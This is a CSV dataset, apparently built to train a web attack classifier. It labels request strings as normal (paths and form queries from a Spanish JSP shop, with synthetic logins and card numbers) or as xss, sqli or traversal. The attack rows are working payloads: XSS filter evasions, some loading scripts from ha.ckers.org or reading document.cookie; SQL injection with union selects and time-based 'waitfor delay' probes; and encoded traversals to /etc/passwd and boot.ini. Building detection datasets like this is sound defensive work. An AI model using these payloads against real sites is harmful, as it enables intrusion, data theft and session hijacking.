payload,type
miembros/imagenes/ogono.jpg,normal
publico/caracteristicas.jsp?id=1,normal
"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">",xss
publico/productos.jsp,normal
.\\..\\.\\..\\.\\..\\.\\..\\{FILE},traversal
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
publico/pagar.jsp?modo=insertar&precio=5696&B1=Confirmar,normal
global/menum.jsp,normal
publico/carrito.jsp,normal
<svg><script ?>alert(1),xss
index.jsp,normal
miembros/imagenes/zarauz.jpg,normal
publico/pagar.jsp?modo=insertar&precio=66&B1=Pasar+por+caja,normal
miembros/index.jsp,normal
miembros/imagenes/zarauz.jpg,normal
global/titulo.jsp,normal
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",xss
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>,xss
..\..\..\{FILE},traversal
imagenes/1.gif,normal
publico/autenticar.jsp?modo=entrar&login=syrett&pwd=cU%E1KeRa&remember=on&B1=Entrar,normal
<script>%(payload)s</script>,xss
imagenes/cmenbul.gif,normal
"echo('IPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;'); ?&gt;",xss
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss
miembros/salir.jsp,normal
"s.UEv: select * from users where id=1 or 1#"". union select null,version() -- 1",sqli
publico/miembros.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>",xss
"<img \x47src=x onerror=""javascript:alert(1)"">",xss
<;SCRIPT SRC=//ha.ckers.org/.j>;,xss
<IMG SRC=”javascript:alert(‘XSS’);”>,xss
"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",xss
"o.UE1: select * from users where id=1 <@. union select 1,version() -- 1",sqli
%2e%2e/%2e%2e/{FILE},traversal
miembros/salir.jsp,normal
miembros/fotos.jsp,normal
"s&noU: select * from users where id='1' or $<\ union select 1,@@VERSION -- 1'",sqli
"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",xss
publico/registro.jsp?modo=registro&login=crosby&password=di874i0&nombre=Beda&apellidos=Soms+Gallaga&email=tyrell%40masqueclases.sr&dni=37871926B&direccion=Calle+Juan+Sebastian+Elcano%2C+157+11%3FB&ciudad=Buenavista&cp=39660&provincia=Palencia&ntc=5032561795933103&B1=Registrar,normal
imagenes/logo.gif,normal
'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,sqli
<script ~~~>alert(0%0)</script ~~~>,xss
imagenes/logo.gif,normal
imagenes/logo.gif,normal
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",xss
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=92&B1=A%F1adir+al+carrito,normal
miembros/index.jsp,normal
miembros/imagenes/ogono.jpg,normal
index.jsp,normal
&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;,xss
imagenes/2.gif,normal
"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;\""&gt;",xss
"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",xss
miembros/editar.jsp?modo=registro&login=oblak&password=08Tiro72&nombre=Brisia&apellidos=Borrachero+Muros&email=swanson%40sexl.co&dni=51734480M&direccion=C%2F+Grabador+David+Roberts+154+1-H&ciudad=San+Mart%EDn+y+Mudri%E1n&cp=01169&provincia=Burgos&ntc=8961981301450385&B1=Registrar,normal
"<IMG SRC=""javascript:javascript:alert(1)""",xss
%%32%65%%32%65%%32%66{FILE},traversal
"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",xss
index.jsp,normal
imagenes/cmenbul.gif,normal
"<img src=x\x09onerror=""javascript:alert(1)"">",xss
"' union (select NULL, NULL, NULL,  (select @@version)) --",sqli
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE},traversal
imagenes/3.gif,normal
&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;,xss
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",xss
imagenes/2.gif,normal
"s{)s: select * from users where id=1 or ""{)"" or 1=1 -- 1",sqli
1\'1,sqli
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",xss
../../../../../../../../../../../../boot.ini,traversal
publico/carrito.jsp,normal
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",xss
publico/pagar.jsp?modo=insertar&precio=9006&B1=Confirmar,normal
publico/registro.jsp?modo=registro&login=keighley&password=ca26lot9&nombre=Denice&apellidos=Mompel+Urdi&email=harkin%40escapadajoven.gq&dni=11696227Z&direccion=Calle+Fresno%2C+66%2C+10%3FD&ciudad=Valdehorna&cp=17743&provincia=Valladolid&ntc=7840274194886704&B1=Registrar,normal
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
/../../../../../../../../../../../boot.ini%00.jpg,traversal
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
imagenes/2.gif,normal
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",xss
publico/registro.jsp?modo=registro&login=lowietje&password=fal429a&nombre=Amelia&apellidos=Masana+Molera&email=guize_ranson%40infotek.bn&dni=69320452Q&direccion=Concejo+De+Alzuza%2C+47%2C+&ciudad=Valdelagua+del+Cerro&cp=42142&provincia=%C1vila&ntc=7953040031397493&B1=Registrar,normal
publico/caracteristicas.jsp?id=2,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=92&B1=A%F1adir+al+carrito,normal
publico/pagar.jsp?modo=insertar&precio=3916&B1=Confirmar,normal
publico/miembros.jsp,normal
"'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",sqli
..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE},traversal
imagenes/2.gif,normal
"<IMG SRC=x onseeking=""alert(String.fromCharCode(88,83,83))"">",xss
<script src=http://yoursite.com/your_files.js></script>,xss
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
../../../../../{FILE},traversal
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
imagenes/cmenbul.gif,normal
imagenes/logo.gif,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/cmenbul.gif,normal
veris-->group<svg/onload=alert(/XSS/)//,xss
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",xss
global/menum.jsp,normal
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE},traversal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=1&B1=A%F1adir+al+carrito,normal
global/estilos.css,normal
o.n&1: select * from users where id=1 <@.$ or 1=1 -- 1,sqli
imagenes/logo.gif,normal
"so()U: select * from users where id='1' + (\) union select 1,@@VERSION -- 1'",sqli
imagenes/3.gif,normal
"<img LOWSRC=""javascript:document.vulnerable=true;"">",xss
publico/autenticar.jsp?modo=entrar&login=monette&pwd=1ob20h9la3&remember=off&B1=Entrar,normal
global/creditos.jsp,normal
imagenes/nuestratierra.jpg,normal
<img/src=`` onerror=this.onerror=confirm(1) ,xss
<script>+-+-1-+-+alert(1)</script>,xss
global/estilos.css,normal
"'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",sqli
"s?.s: select * from users where id=1 or ""]."" or 1=1 -- 1",sqli
%27%20or%201=1,sqli
"so(s: select * from users where id=1 or ""&("" or 1=1 -- 1",sqli
publico/autenticar.jsp?modo=entrar&login=metcalfe&pwd=FilAnTR%F3pIca&remember=on&B1=Entrar,normal
"d=\""alert('XSS');\\"")\"";",xss
"\"";document.vulnerable=true;;//",xss
global/estilos.css,normal
*(|(objectclass=*)),sqli
imagenes/1.gif,normal
"&lt;SCRIPT a=\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
imagenes/logo.gif,normal
global/creditos.jsp,normal
global/estilos.css,normal
global/creditos.jsp,normal
miembros/imagenes/castro.jpg,normal
publico/autenticar.jsp?modo=entrar&login=odden&pwd=8030e&remember=on&B1=Entrar,normal
imagenes/nuestratierra.jpg,normal
miembros/salir.jsp,normal
..%%35%63{FILE},traversal
"<IMG SRC=x ondragend=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/cmenbul.gif,normal
"<html><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>""></BODY></html>",xss
publico/pagar.jsp?modo=insertar&precio=8328&B1=Pasar+por+caja,normal
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE},traversal
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE},traversal
index.jsp,normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
publico/autenticar.jsp?modo=entrar&login=rong&pwd=d6mnificar&remember=off&B1=Entrar,normal
%uff0e%uff0e/%uff0e%uff0e/{FILE},traversal
%2e%2e%2f%2e%2e%2f{FILE},traversal
publico/autenticar.jsp?modo=entrar&login=jacobsen&pwd=ayunQue&remember=on&B1=Entrar,normal
"</ foo=""><script>javascript:alert(1)</script>"">",xss
"s,o1&: select * from users where id=1 or 1#"",=1 or 1=1 -- 1",sqli
imagenes/1.gif,normal
publico/miembros.jsp,normal
imagenes/cmenbul.gif,normal
.o&1c: select * from users where id=1. <@ or 1=1 -- 1,sqli
global/menum.jsp,normal
admin' #,sqli
publico/miembros.jsp,normal
index.jsp,normal
miembros/index.jsp,normal
publico/caracteristicas.jsp?id=1,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/logo.gif,normal
publico/pagar.jsp?modo=insertar&precio=1152&B1=Pasar+por+caja,normal
"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",xss
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../{FILE},traversal
"<iframe  src=""&Tab;javascript:prompt(1)&Tab;"">",xss
miembros/fotos.jsp,normal
&o1&1: select * from users where id=1 or \<1 or 1=1 -- 1,sqli
imagenes/cmenbul.gif,normal
imagenes/logo.gif,normal
<IMG SRC=&{javascript:alert(1);};>,xss
"s.?s: select * from users where id=1 or "".]"" or 1=1 -- 1",sqli
<script>({0:#0=alert/#0#/#0#(0)})</script>,xss
"&1ovc: select * from users where id=1 or 1&@#=1 union select 1,version() -- 1",sqli
global/menum.jsp,normal
miembros/imagenes/ogono.jpg,normal
global/creditos.jsp,normal
publico/pagar.jsp?modo=insertar&precio=8715&B1=Confirmar,normal
"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",xss
publico/registro.jsp?modo=registro&login=farlay&password=escribida&nombre=Nela&apellidos=Magrans+Ribes&email=tchistyakov-linn-baker%40pool-control.tw&dni=12361918Q&direccion=Guipuzcoa+198%2C+1%3FD&ciudad=Villanueva+de+Sigena&cp=25300&provincia=Guip%FAzcoa&ntc=6545971193644202&B1=Registrar,normal
"""><img src=x onerror=javascript:alert('A')>",xss
publico/caracteristicas.jsp?id=1,normal
miembros/imagenes/zarauz.jpg,normal
"<div/onmouseover='alert(1)'> style=""x:"">",xss
<script\x0C>javascript:alert(1)</script>,xss
"<IMG SRC=""livescript:[code]"">",xss
publico/autenticar.jsp?modo=entrar&login=pearce&pwd=coRDiTa&remember=on&B1=Entrar,normal
%2e%2e\%2e%2e\{FILE},traversal
&#X00003c,xss
miembros/editar.jsp?modo=registro&login=hoyer&password=poli8%E1l2a&nombre=Gema&apellidos=Magriny%E0&email=delaune%40tintasultravioleta.io&dni=08806627L&direccion=Av.+De+La+Reina+Sofia+151+&ciudad=Poboleda&cp=43700&provincia=Guadalajara&ntc=3288111380573813&B1=Registrar,normal
"><h1><IFRAME width=""420"" height=""315"" frameborder=""0"" onmouseover=""document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr",xss
miembros/imagenes/zarauz.jpg,normal
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
........................................................................../../../../../../../../{FILE},traversal
publico/carrito.jsp,normal
miembros/imagenes/castro.jpg,normal
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
miembros/editar.jsp?modo=registro&login=asawa&password=S4DsUDEStE&nombre=Rhett&apellidos=Venzal+Tamayo&email=whitehead.kogan%40lamarsrl.qa&dni=98585223R&direccion=C%2F+Naturopata+Diego+Prieto+58%2C+&ciudad=Piedramillera&cp=33120&provincia=Pontevedra&ntc=7058252446193830&B1=Registrar,normal
publico/caracteristicas.jsp?id=1,normal
"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",xss
imagenes/logo.gif,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/menum.jsp,normal
index.jsp,normal
imagenes/2.gif,normal
publico/registro.jsp?modo=registro&login=nelia3&password=embel1e542&nombre=H%E9rcules&apellidos=Diez+Lizano&email=prueckner%40helicopter.com.gf&dni=33095587J&direccion=C%2F+Afrodita+160%2C+5%3FB&ciudad=Vistabella&cp=06894&provincia=Huelva&ntc=0367766571989021&B1=Registrar,normal
miembros/imagenes/zarauz.jpg,normal
..\\\..\\\..\\\..\\\..\\\..\\\{FILE},traversal
<<SCRIPT>%(payload)s//<</SCRIPT>,xss
miembros/fotos.jsp,normal
publico/miembros.jsp,normal
admin' or '1'='1'--,sqli
miembros/imagenes/castro.jpg,normal
"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss
"<img\x32src=x onerror=""javascript:alert(1)"">",xss
"UE1o,: select * from users where id=1 union select 1<@,version() -- 1",sqli
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",xss
global/titulo.jsp,normal
miembros/index.jsp,normal
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=66&B1=A%F1adir+al+carrito,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/fotos.jsp,normal
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=50&B1=A%F1adir+al+carrito,normal
..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE},traversal
"""`'><script>\xE2\x80\x80javascript:alert(1)</script>",xss
publico/miembros.jsp,normal
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss
"sv:s: select * from users where id=1 or ""@:""=1 or 1=1 -- 1",sqli
miembros/index.jsp,normal
%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
imagenes/nuestratierra.jpg,normal
"<style type=""text/css"">BODY{background:url(""javascript:document.vulnerable=true"")}</style>",xss
publico/autenticar.jsp?modo=entrar&login=dalt&pwd=d0s9pi2car&remember=off&B1=Entrar,normal
"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"ABC<div style=""x:\x0Cexpression(javascript:alert(1)"">DEF",xss
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
imagenes/nuestratierra.jpg,normal
index.jsp,normal
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script",xss
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
"&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;",xss
imagenes/cmenbul.gif,normal
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,xss
&#X03c,xss
global/creditos.jsp,normal
global/titulo.jsp,normal
perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out,xss
publico/autenticar.jsp?modo=entrar&login=culham&pwd=g16i7A0a&remember=on&B1=Entrar,normal
imagenes/3.gif,normal
publico/autenticar.jsp?modo=entrar&login=terangue&pwd=potrear&remember=on&B1=Entrar,normal
imagenes/logo.gif,normal
imagenes/logo.gif,normal
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",xss
..../..../..../..../{FILE},traversal
hi' or 1=1 --,sqli
publico/caracteristicas.jsp?id=2,normal
publico/carrito.jsp,normal
imagenes/logo.gif,normal
imagenes/nuestratierra.jpg,normal
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal
miembros/index.jsp,normal
\..\..\..\..\..\..\..\..\..\..\etc\passwd,traversal
".oUEf: select * from users where id=1. <@ union select version(),version() -- 1",sqli
miembros/editar.jsp?modo=registro&login=nina&password=pulsar&nombre=Oreste&apellidos=Ambatll%E9+Comalada&email=birley%40euskalcasino.pro&dni=94505880F&direccion=Convento+De+Las+Due%F1as+86+&ciudad=Casas+de+Miravete&cp=34340&provincia=Granada&ntc=1571428541757626&B1=Registrar,normal
imagenes/1.gif,normal
imagenes/2.gif,normal
miembros/imagenes/zarauz.jpg,normal
global/estilos.css,normal
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
"<div STYLE=""width: expression(document.vulnerable=true);"">",xss
<--`<img/src=` onerror=alert(1)> --!>,xss
publico/autenticar.jsp?modo=entrar&login=franza&pwd=a7%E19ga44&remember=on&B1=Entrar,normal
..%25c0%25af..%25c0%25af{FILE},traversal
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss
"<img src\x32=x onerror=""javascript:alert(1)"">",xss
<b <script>alert(1)</script>0,xss
index.jsp,normal
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},traversal
publico/caracteristicas.jsp?id=1,normal
publico/carrito.jsp,normal
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE},traversal
publico/pagar.jsp?modo=insertar&precio=3188&B1=Confirmar,normal
miembros/imagenes/zarauz.jpg,normal
publico/pagar.jsp?modo=insertar&precio=2969&B1=Pasar+por+caja,normal
miembros/imagenes/castro.jpg,normal
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=46&B1=A%F1adir+al+carrito,normal
publico/miembros.jsp,normal
imagenes/logo.gif,normal
"<img \x00src=x onerror=""javascript:alert(1)"">",xss
publico/autenticar.jsp?modo=entrar&login=luhmaan&pwd=97cO38225s9&remember=on&B1=Entrar,normal
%c0%2e%c0%2e/{FILE},traversal
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,xss
<;!--[if gte IE 4]>;           ,xss
imagenes/nuestratierra.jpg,normal
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
imagenes/3.gif,normal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE},traversal
<img src=xss onerror=alert(1)>,xss
"&lt;XML SRC=\""xsstest&#46;xml\"" ID=I&gt;&lt;/XML&gt;",xss
"UE1f(: select * from users where id=1 union select 1<@$,version() -- 1",sqli
